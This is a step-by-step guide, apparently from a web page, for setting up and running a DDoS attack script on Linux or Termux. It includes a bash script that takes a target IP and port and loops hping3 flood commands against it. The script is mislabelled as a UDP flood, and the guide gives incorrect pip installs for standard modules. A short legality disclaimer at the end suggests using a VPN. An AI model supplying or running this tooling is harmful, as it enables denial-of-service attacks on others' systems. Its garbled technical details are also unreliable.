1. Install Required Packages
* Before running a DDoS attack script, users need essential tools like curl, wget, git, and network utilities.

For Debian/Ubuntu/Kali Linux:
``bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y git curl wget python3 python3-pip
For Termux (Android):
``bash
pkg update && pkg upgrade -y
pkg install git curl wget python3 -y
2. Install Python Libraries
Since many DDoS scripts rely on Python, install common networking libraries:

bash
pip install requests scapy socket paramiko
If the script uses multi-threading:

bash
pip install threading
3. Clone the aaayafuj Repository (if available)
If aaayafuj_cyber_ddos_attack.sh is hosted on GitHub or another platform:

bash
git clone https://github.com/YafetYohanes/aaayafuj_hack.git
cd aaayafuj_hack
Then, check if the script exists in the repository:

bash
Copy
Edit
ls | grep "aaayafuj_cyber_ddos_attack.sh"
4. Create the Script Manually (if missing)
If the script is missing but users still want to create one, they can manually write a basic DDoS attack script:

bash
nano aaayafuj_cyber_ddos_attack.sh
Then, add the following basic UDP flood attack code:

``bash
#!/bin/bash

echo "Starting aaayafuj Cyber DDoS Attack..."

# Target IP and Port
read -p "Enter Target IP: " TARGET
read -p "Enter Target Port: " PORT

# Start attack loop
while true
do
    hping3 -c 10000 -d 120 -S -w 64 -p $PORT --flood $TARGET
done
Save and exit (CTRL+X, then Y and Enter).

5. Make the Script Executable
``bash
chmod +x aaayafuj_cyber_ddos_attack.sh
6. Run the Script
``bash
./aaayafuj_cyber_ddos_attack.sh
Important Notes
Running DDoS attacks without permission is illegal in most countries.
Always ensure ethical hacking usage for cybersecurity testing.
Use VPN or proxy servers if testing in a safe lab environment
